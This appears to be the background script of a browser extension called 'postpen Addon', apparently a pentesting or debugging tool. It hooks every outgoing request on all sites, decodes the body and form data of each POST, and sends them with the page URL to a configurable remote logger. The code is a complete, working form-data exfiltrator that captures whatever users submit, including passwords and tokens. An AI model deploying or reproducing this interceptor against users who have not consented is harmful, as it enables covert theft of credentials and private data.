let logger_url = "";
browser.storage.sync.get("logger_url").then((result)=>{
	logger_url = result.logger_url;
	console.log(logger_url)
});

function onBeforeRequest(data){
	if (data.method!=='POST') return;
	if (!data.requestBody) return; // ?
	const url = data.url;
	if (url==logger_url) return;
	console.info(data);
	const rawData = decodeURIComponent(String.fromCharCode.apply(null,new Uint8Array(data.requestBody.raw[0].bytes)));
	const formData = data.requestBody.formData;
	const formDataString = JSON.stringify({formData});
	const method = data.method;
	const redID = data.requestId;
	const loggerText = `url: ${url}\nrawData: ${rawData}\nformData: ${formDataString}`;
	fetch(logger_url,{ method:method, body:loggerText });
}

browser.webRequest.onBeforeRequest.addListener(
	onBeforeRequest,
	{urls: ['<all_urls>']}
	,['requestBody']
);

fetch(logger_url,{ method:'POST', body:'postpen Addon loaded',cache: 'no-cache'});